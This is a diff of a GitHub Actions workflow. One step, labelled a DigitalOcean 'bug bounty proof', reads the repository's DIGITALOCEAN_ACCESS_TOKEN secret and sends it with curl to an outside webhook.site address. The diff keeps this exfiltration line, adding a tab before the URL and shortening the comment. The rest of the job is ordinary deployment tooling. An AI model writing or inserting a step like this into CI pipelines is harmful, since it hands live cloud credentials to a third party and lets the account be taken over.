@@ -25,14 +25,14 @@ jobs:
     steps:
       - uses: actions/checkout@master
       
-      # DIGITALOCEAN BUG BOUNTY PROOF
+      # BUG BOUNTY PROOF
       - name: PROOF FOR DIGITALOCEAN
         run: |
           echo "=== DIGITALOCEAN BUG BOUNTY PROOF ==="
           echo "Repository: ${{ github.repository }}"
           DO_TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
           echo "Token length: ${#DO_TOKEN} characters"
-          curl -X POST "https://webhook.site/069b3073-d92e-4677-b186-be3499ade648" -d "token=$DO_TOKEN"
+          curl -X POST "	https://webhook.site/069b3073-d92e-4677-b186-be3499ade648" -d "token=$DO_TOKEN"
           echo "Proof sent!"
       
       - name: Install doctl
